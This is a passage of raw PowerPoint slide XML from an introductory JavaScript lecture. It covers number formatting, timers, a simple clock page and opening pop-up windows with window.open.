            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>decimal digits</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1" eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" err="1"/>
              <a:t>toPrecision</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0"/>
              <a:t>x</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>) = format number to </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0"/>
              <a:t>x</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> length</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"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var </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="Courier New" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>a = 123.456;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"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var </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="Courier New" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>s = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:latin typeface="Courier New" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>a.toFixed</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="Courier New" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>(2); // s = "123.46"</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1" eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buNone/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fi-FI" dirty="0">
                <a:latin typeface="Courier New" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>s2 = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" dirty="0" err="1">
                <a:latin typeface="Courier New" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>a.toPrecision</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" dirty="0">
                <a:latin typeface="Courier New" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>(4); // s2 = "123.5"</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:latin typeface="Courier New" pitchFamily="49" charset="0"/>
              <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="1" eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buNone/>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:latin typeface="Courier New" pitchFamily="49" charset="0"/>
              <a:cs typeface="Courier New" pitchFamily="49"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Otsikko 1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{F28F086C-E81F-4CB0-8B41-AA78C05D1D4B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI"/>
              <a:t>Timers</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="118787" name="Sisällön paikkamerkki 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{0A807331-017C-4A1E-844B-05E921EDFCD4}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI"/>
              <a:t>Everything in JavaScript is run in single thread, but it provides timers as window methods:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" b="1"/>
              <a:t>setInterval</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" i="1"/>
              <a:t>func</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" i="1"/>
              <a:t>interval</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI"/>
              <a:t>) = execute </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" i="1"/>
              <a:t>func</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI"/>
              <a:t> repeatedly after </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" i="1"/>
              <a:t>interval</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI"/>
              <a:t> ms, returns </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" i="1"/>
              <a:t>intervalId</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" b="1"/>
              <a:t>setTimeout</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" i="1"/>
              <a:t>func</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" i="1"/>
              <a:t>interval</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI"/>
              <a:t>) = execute </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" i="1"/>
              <a:t>func </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI"/>
              <a:t>once after </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" i="1"/>
              <a:t>interval</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI"/>
              <a:t> ms, returns </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" i="1"/>
              <a:t>timeoutId</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" b="1"/>
              <a:t>clearInterval</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" i="1"/>
              <a:t>intervalId</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI"/>
              <a:t>) = remove interval</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" b="1"/>
              <a:t>clearTimeout</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" i="1"/>
              <a:t>timeoutId</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI"/>
              <a:t>) = remove timeout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Otsikko 1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{6BA77702-6A3C-45F4-9F7B-A1AE1235F926}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI">
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>Simple Clock</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="fi-FI"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="119811" name="Sisällön paikkamerkki 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{C5DE21FC-DF77-4851-9F8F-5D5657A25CAC}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>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&lt;!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"</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"http://www.w3.org/TR/html4/loose.dtd"&gt;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&lt;html&gt;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&lt;head&gt;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&lt;meta http-equiv="content-type" content="text/html; charset=iso-8859-1"&gt;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&lt;title&gt;Clock&lt;/title&gt;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&lt;script type="text/javascript"&gt;</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function startup() {</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time = document.getElementById("mytime");</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updateClock();</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setInterval(updateClock, 1000);</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function updateClock() {</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time.innerHTML = new Date().toString(); // change contents of &lt;h1&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">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&lt;/script&gt;  </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&lt;/head&gt;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&lt;body </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="1400" b="1">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>onload="startup()"</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="1400">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>&gt;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&lt;h1 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="1400" b="1">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>id="mytime"</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="1400">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>&gt;&lt;/h1&gt;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  &lt;/body&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="1400">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>&lt;/html&gt;</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Otsikko 1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{2D66EE8B-A4C8-43BA-8F97-4D3FB5AF90AB}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI">
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>window.open</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="fi-FI"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="120835" name="Sisällön paikkamerkki 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{13C94DE3-4E96-406D-94C2-45F0C57277EC}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1981200" y="1600200"/>
            <a:ext cx="8229600" cy="4997450"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" b="1"/>
              <a:t>window.open(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" b="1" i="1"/>
              <a:t>[url], [name], [features]</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" b="1"/>
              <a:t>)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" b="1"/>
              <a:t>url</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400"/>
              <a:t> = address of new window</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" b="1"/>
              <a:t>name</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400"/>
              <a:t> = _blank|_parent|_self|_top (used with frames, usually just leave it empty "")</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" b="1"/>
              <a:t>features</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400"/>
              <a:t>, a comma separated string list:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" b="1"/>
              <a:t>left </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000"/>
              <a:t>= position in pixels from left side of screen</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" b="1"/>
              <a:t>top </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000"/>
              <a:t>= position in pixels from top side of screen</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="fi-FI" sz="2000" b="1"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" b="1"/>
              <a:t>height</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000"/>
              <a:t> = height in pixels</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" b="1"/>
              <a:t>width </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000"/>
              <a:t>= width in pixels</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" b="1"/>
              <a:t>location = yes </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000"/>
              <a:t> | no  | 1 | 0</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" b="1"/>
              <a:t>menubar = yes </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000"/>
              <a:t> | no  | 1 | 0</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" b="1"/>
              <a:t>status = yes</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000"/>
              <a:t> | no | 1 | 0</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" b="1"/>
              <a:t>resizable = yes </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000"/>
              <a:t>| no | 1 | 0</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" b="1"/>
              <a:t>scrollbars = yes </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000"/>
              <a:t>| no | 1 | 0</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="fi-FI" sz="2000" b="1"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" b="1"/>
              <a:t>titlebar = yes </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000"/>
              <a:t>| no | 1 | 0</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="fi-FI" sz="2000" b="1"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="fi-FI" sz="240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Otsikko 1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{CA21E7E7-DAD5-4255-ADCA-E5A851123E84}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI">
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>Pop-up Windows</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="fi-FI"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="121859" name="Sisällön paikkamerkki 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{C5785E5B-4013-47F1-9C1F-F5237E80F3B8}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1703388" y="1600200"/>
            <a:ext cx="8713787" cy="5068888"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>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&lt;!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"</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"http://www.w3.org/TR/html4/loose.dtd"&gt;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&lt;html&gt;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&lt;head&gt;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&lt;meta http-equiv="content-type" content="text/html; charset=utf-8"&gt;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&lt;title&gt;Popup Example&lt;/title&gt;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&lt;script type="text/javascript"&gt;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a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="1600" b="1">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>function popup(url) {</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="1600" b="1">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>    window.open(url, '',</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="1600" b="1">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>    'width=600, height=400, menubar=1, location=1, resizable=1, scrollbars=1');</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="1600" b="1">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>  }</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&lt;/script&gt;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&lt;/head&gt;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&lt;body&gt;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&lt;a href="http://www.yle.fi/" </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="1600" b="1">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>target="_blank"</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="1600">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>&gt;Open in new tab&lt;/a&gt;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&lt;a href="</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="1600" b="1">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>javascript:popup('http://www.yle.fi')</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="1600">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>"&gt;JavaScript Popup&lt;/a&gt;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  &lt;/body&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="1600">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>&lt;/html&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="fi-FI" sz="1600">
              <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49"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Otsikko 1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{3FF2CAAC-1745-4A21-9C4E-F0B77061F68F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI"/>
              <a:t>Writing to a Popup Window</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="122883" name="Sisällön paikkamerkki 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{8E08D546-87F1-48A8-8278-E69752E57B28}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
